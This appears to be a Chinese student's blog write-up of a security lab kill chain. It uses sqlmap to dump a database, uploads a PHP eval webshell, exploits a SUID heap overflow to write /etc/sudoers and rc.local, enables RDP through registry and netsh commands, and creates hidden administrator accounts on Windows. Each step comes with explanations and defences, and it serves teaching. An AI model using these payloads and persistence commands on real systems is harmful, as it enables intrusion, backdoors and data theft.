---
layout: post
title: 安全攻防综合实验 lab10 killchain
date: 2025-11-27 00:00 +0800
categories: [Web安全]
tags: [SQL注入, 文件上传, 提权, Linux, Windows, 渗透测试]
mathjax: true
toc: true
---

其他的实验可以去看慕念大佬的博客，但是这个实验killchain是没有的，所以我打算写一下造福后人，传递薪火！

<!--more-->

## Linux远程入侵

### sql注入

#### 知识点分析

**SQL注入原理：**
SQL注入是一种常见的Web应用程序安全漏洞，攻击者通过在应用程序的输入字段中插入恶意的SQL代码，从而欺骗数据库服务器执行非预期的SQL命令。当应用程序没有对用户输入进行充分的验证和过滤时，攻击者可以：
- 绕过身份验证机制
- 读取、修改或删除数据库中的敏感数据
- 执行数据库管理操作
- 在某些情况下，甚至可以在数据库服务器上执行系统命令

**技术要点：**
1. **注入点识别**：通过端口扫描（nmap）发现开放的服务端口，定位Web应用程序入口点
2. **自动化工具使用**：sqlmap是专门用于检测和利用SQL注入漏洞的自动化工具，能够：
   - 自动检测注入点类型（GET、POST、Cookie等）
   - 识别数据库类型和版本
   - 枚举数据库、表、列结构
   - 提取数据内容
3. **注入类型**：本实验中涉及POST型注入，需要指定`--method=POST`和`--data`参数
4. **会话管理**：使用`--cookie`参数保持会话状态，这对于需要认证的注入点至关重要

**安全影响：**
- 数据泄露：可能导致用户信息、密码等敏感数据泄露
- 权限提升：可能获取管理员权限，完全控制数据库
- 系统入侵：在某些配置下，可能进一步入侵操作系统

**防护措施：**
- 使用参数化查询（Prepared Statements）
- 对用户输入进行严格验证和过滤
- 最小权限原则：数据库用户只授予必要权限
- 定期进行安全审计和渗透测试

端口扫描：
```
nmap -sV -sC -p- 192.168.1.6
```
发现端口80开放

<img src="/img/lab10/image.png" alt="端口扫描结果" style="max-width: 80%; height: auto; display: block; margin: 1rem auto; border-radius: 8px;">

发现注入点，使用sqlmap：

```
# 基础注入检测（确认漏洞存在）
sqlmap -u "http://10.20.26.253:38457/welcome.php" \
  --method=POST \
  --data="search=123" \
  --cookie="PHPSESSID=lsjiieko0556rf6n365kbnlb34" \
  --batch

# 如果确认漏洞存在，获取数据库列表
sqlmap -u "http://10.20.26.253:38457/welcome.php" \
  --method=POST \
  --data="search=123" \
  --cookie="PHPSESSID=lsjiieko0556rf6n365kbnlb34" \
  --dbs \
  --batch

# 获取指定数据库的表（假设数据库名为webapp）
sqlmap -u "http://10.20.26.253:38457/welcome.php" \
  --method=POST \
  --data="search=123" \
  --cookie="PHPSESSID=lsjiieko0556rf6n365kbnlb34" \
  -D webapp \
  --tables \
  --batch
```
最后使用：
```
sqlmap -u "http://192.168.1.6/welcome.php" \
  --method=POST \
  --data="search=123" \
  --cookie="PHPSESSID=lsjiieko0556rf6n365kbnlb34" \
  -D webapphacking \
  --dump-all \
  --batch
```
导出所有webapphacking数据库表中的内容：

<img src="/img/lab10/image-1.png" alt="数据库导出结果" style="max-width: 80%; height: auto; display: block; margin: 1rem auto; border-radius: 8px;">

### 文件上传

#### 知识点分析

**文件上传漏洞原理：**
文件上传漏洞是指Web应用程序允许用户上传文件，但未对上传的文件进行充分的安全检查，导致攻击者可以上传恶意文件（如Webshell、木马等）到服务器，从而获取服务器控制权。

**技术要点：**
1. **Webshell原理**：本实验使用的PHP一句话木马`<?php @eval($_POST['shell']); ?>`：
   - `eval()`函数可以执行任意PHP代码
   - `$_POST['shell']`接收POST参数中的代码并执行
   - `@`符号用于抑制错误信息，提高隐蔽性
2. **文件上传绕过技术**：
   - 文件类型检查绕过（修改Content-Type、文件扩展名等）
   - 文件内容检查绕过（使用图片马、代码混淆等）
   - 路径遍历攻击（../目录穿越）
3. **蚁剑连接**：中国蚁剑（AntSword）是一款Webshell管理工具，通过Webshell与目标服务器建立连接，提供文件管理、命令执行等功能
4. **文件定位**：上传后的文件需要确定存储路径，常见位置包括：
   - 上传目录（uploads/、files/等）
   - 临时目录
   - 通过目录遍历或信息泄露获取路径

**安全影响：**
- 服务器完全沦陷：攻击者可以执行任意系统命令
- 数据泄露：可以访问服务器上的所有文件
- 横向渗透：可以作为跳板攻击内网其他系统
- 持久化后门：即使修复漏洞，已上传的Webshell仍可继续使用

**防护措施：**
- 严格的文件类型验证（白名单机制）
- 文件内容检查（文件头、病毒扫描）
- 文件重命名（避免直接使用用户提供的文件名）
- 限制上传目录的执行权限
- 将上传文件存储在Web根目录外，通过脚本访问
- 定期扫描和清理可疑文件

登录Ultraman用户，发现文件上传接口

<img src="/img/lab10/image-2.png" alt="文件上传接口" style="max-width: 80%; height: auto; display: block; margin: 1rem auto; border-radius: 8px;">

将木马文件shell.php上传：
```php
<?php @eval($_POST['shell']); ?>
```
然后稍微找一下上传文件的位置，蚁剑连接：

<img src="/img/lab10/image-3.png" alt="蚁剑连接" style="max-width: 80%; height: auto; display: block; margin: 1rem auto; border-radius: 8px;">

获得shell

<img src="/img/lab10/image-4.png" alt="获得shell" style="max-width: 80%; height: auto; display: block; margin: 1rem auto; border-radius: 8px;">

### 提权

#### 知识点分析

**Linux提权原理：**
提权（Privilege Escalation）是指将当前用户的权限提升到更高权限（通常是root）的过程。在Linux系统中，常见的提权方式包括：
1. **SUID程序利用**：SUID（Set User ID）是一种特殊的文件权限，当程序设置了SUID位时，执行该程序的用户会临时获得程序所有者的权限
2. **堆溢出漏洞**：堆溢出是一种内存安全漏洞，当程序向堆内存写入数据时，没有正确检查边界，导致覆盖相邻内存区域，可能被利用来执行任意代码或修改关键数据

**技术要点：**
1. **SUID程序查找**：使用`find / -perm -4000 2>/dev/null`查找具有SUID权限的程序
2. **堆溢出利用**：
   - 本实验中的`.heap`程序存在堆溢出漏洞
   - 通过精心构造的输入，可以覆盖关键内存区域
   - 利用漏洞修改系统关键文件（如`/etc/passwd`、`/etc/sudoers`、`/etc/rc.local`）
3. **文件注入技术**：
   - `/etc/passwd`：存储用户账户信息，通过注入新用户或修改现有用户UID/GID实现提权
   - `/etc/sudoers`：配置sudo权限，添加NOPASSWD规则可无需密码执行sudo命令
   - `/etc/rc.local`：系统启动脚本，可写入命令实现持久化
4. **权限维持**：通过修改系统配置文件，确保即使程序修复，仍能保持高权限访问

**安全影响：**
- 完全控制系统：获得root权限后可以执行任何操作
- 数据窃取：可以访问所有文件和系统资源
- 权限维持：通过后门实现长期控制
- 横向渗透：可以作为跳板攻击其他系统

**防护措施：**
- 最小权限原则：只给程序必要的权限，避免不必要的SUID设置
- 代码审计：定期检查SUID程序，移除不必要的SUID位
- 内存安全：使用安全的编程语言和内存管理机制
- 文件完整性监控：监控关键系统文件的修改
- 定期安全更新：及时修补已知漏洞

检索具有suid的程序：

<img src="/img/lab10/image-5.png" alt="SUID程序检索" style="max-width: 80%; height: auto; display: block; margin: 1rem auto; border-radius: 8px;">

发现这里有一个.heap程序明显具有漏洞，尝试使用这个漏洞提权。

发现是堆溢出漏洞，进行攻击：

```
$'hacker::0:0::/:/bin/sh\nAAAAAAAAA/etc/passwd'
```

<img src="/img/lab10/image-6.png" alt="堆溢出利用" style="max-width: 80%; height: auto; display: block; margin: 1rem auto; border-radius: 8px;">

成功了，但是并非完全成功，因为登录不进去

换一种方法，尝试向rc.loacal文件写入：

payload：

```
./.heap 'chpasswd root:1                #/etc/rc.local'
./.heap 'chpasswd <<< root:1            #/etc/rc.local'
```

执行cat看看，成功了：

<img src="/img/lab10/image-8.png" alt="写入rc.local" style="max-width: 80%; height: auto; display: block; margin: 1rem auto; border-radius: 8px;">

依然无法登录，尝试其他办法，写入sudoers文件试试：

```
./.heap 'www-data ALL=(ALL) NOPASSWD:ALL #/etc/sudoers'
```
成功了：


<img src="/img/lab10/image-9.png" alt="写入sudoers" style="max-width: 80%; height: auto; display: block; margin: 1rem auto; border-radius: 8px;">

找到控制转移文件：

<img src="/img/lab10/image-10.png" alt="控制转移文件" style="max-width: 80%; height: auto; display: block; margin: 1rem auto; border-radius: 8px;">

现在获得了账号密码：

Happy/Christmas

### 登录windows桌面

#### 知识点分析

**Windows远程桌面原理：**
远程桌面协议（RDP，Remote Desktop Protocol）是微软开发的专有协议，允许用户通过网络远程连接到Windows系统并控制桌面环境。RDP默认使用TCP端口3389。

**技术要点：**
1. **RDP服务启用**：
   - Windows系统默认可能禁用远程桌面连接
   - 通过注册表修改`fDenyTSConnections`值（0=启用，1=禁用）可以控制RDP服务
   - 注册表路径：`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server`
2. **防火墙配置**：
   - Windows防火墙可能阻止RDP连接
   - 需要添加防火墙规则允许远程桌面流量
   - 使用`netsh`命令可以配置防火墙规则
3. **SSH远程管理**：
   - Windows 10/Server 2019及更高版本支持OpenSSH服务器
   - 通过SSH可以远程执行命令，即使RDP被禁用
   - 提供了另一种远程管理方式
4. **安全限制绕过**：
   - 通过SSH连接后，可以修改系统配置启用RDP
   - 需要同时处理注册表和防火墙两个层面的限制
   - 某些安全策略可能导致连接后立即断开，需要进一步排查

**安全影响：**
- 完全控制目标系统：获得图形界面访问权限
- 数据窃取：可以访问桌面文件、剪贴板等
- 持久化访问：建立稳定的远程访问通道
- 横向渗透：可以作为跳板攻击内网其他系统

**防护措施：**
- 限制RDP访问IP范围
- 使用强密码和账户锁定策略
- 启用网络级身份验证（NLA）
- 修改默认RDP端口（3389）
- 使用VPN或堡垒机进行访问控制
- 启用审计日志监控异常登录
- 定期检查远程访问账户和权限

直接使用windows的mstsc来登录，发现被禁止了，需要修改密码，于是将密码改成123456，还是登不进去

这个时候发现，其实该主机是限制了远程桌面的登录，所以没法登录，怎么办呢？

我们可以使用ssh远程登录，使用kali的ssh远程登录，上去之后输入指令：

```bash
# 启用远程桌面
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```
启动桌面，尝试登录，确实成功了，登录进去了，但是几秒钟过后，就会被强制退出，在此之后，也无法再次登录，怎么回事呢？因为被防火墙给拦截了，于是，关闭防火墙，下一步，登录。
```
# 关闭防火墙（或添加例外）
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
```

登录成功并获取到截图

<img src="/img/lab10/image-11.png" alt="登录成功截图" style="max-width: 80%; height: auto; display: block; margin: 1rem auto; border-radius: 8px;">

最后，关于注册隐藏账号，大概有三种方式：

#### 知识点分析

**Windows隐藏账号原理：**
隐藏账号是一种权限维持技术，攻击者在获得系统控制权后，创建不易被发现的用户账户，用于长期控制目标系统。隐藏账号的核心是绕过Windows系统的正常账户显示机制。

**技术要点：**
1. **方法一：$结尾隐藏账号**
   - Windows系统中，以`$`结尾的用户名在`net user`命令中默认不显示
   - 这是最简单的隐藏方式，但通过`net user`命令仍可查看
   - 在用户管理界面（lusrmgr.msc）中可能仍然可见
   - 隐蔽性较低，容易被发现

2. **方法二：注册表隐藏账号**
   - 通过修改注册表项`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList`
   - 将用户名对应的值设置为0，可以隐藏登录界面显示
   - 比方法一更隐蔽，但账户仍然存在于系统中
   - 可以通过注册表查询或专业工具发现

3. **方法三：账号克隆（最隐蔽）**
   - 通过修改SAM（Security Account Manager）数据库中的SID（Security Identifier）
   - 将隐藏账号的SID修改为管理员账号的SID
   - 系统会将隐藏账号识别为管理员账号
   - 这是最隐蔽的方式，因为账户信息与管理员完全一致
   - 需要直接操作SAM数据库，风险较高

**安全影响：**
- 权限维持：即使原漏洞被修复，仍可通过隐藏账号访问
- 隐蔽性强：普通管理员可能难以发现
- 长期控制：可以实现对系统的长期、隐蔽控制
- 审计绕过：可能绕过部分安全审计机制

**检测与防护措施：**
- 定期检查用户账户列表，使用多种工具交叉验证
- 监控SAM数据库的修改
- 使用专业的安全工具（如Sysinternals Suite）检测隐藏账号
- 启用账户审计，记录所有账户创建和修改操作
- 限制注册表访问权限
- 定期审查管理员权限账户
- 使用组策略限制账户创建权限

在Windows中建立隐蔽账号的方法：
方法一：创建以$结尾的隐藏账号
```
# 创建隐藏账号（net user默认不显示$结尾的账号）
net user hacker$ P@ssw0rd123! /add
net localgroup administrators hacker$ /add
```

方法二：修改注册表彻底隐藏账号
```
# 1. 创建普通账号
net user shadowuser P@ssw0rd123! /add
net localgroup administrators shadowuser /add

# 2. 修改注册表隐藏账号
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v shadowuser /t REG_DWORD /d 0 /f

# 3. 隐藏登录界面显示
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts" /f
```
方法三：克隆管理员账号（最隐蔽）
```
# 1. 先激活内置管理员账号
net user administrator /active:yes
net user administrator P@ssw0rd123!

# 2. 创建隐蔽账号
net user backupadmin$ P@ssw0rd123! /add

# 3. 导出管理员SID
wmic useraccount where name='administrator' get sid

# 4. 将隐蔽账号SID改为管理员SID（通过注册表）
reg add "HKLM\SAM\SAM\Domains\Account\Users\000003E9" /f
```

这几种方法应该都是能成功的

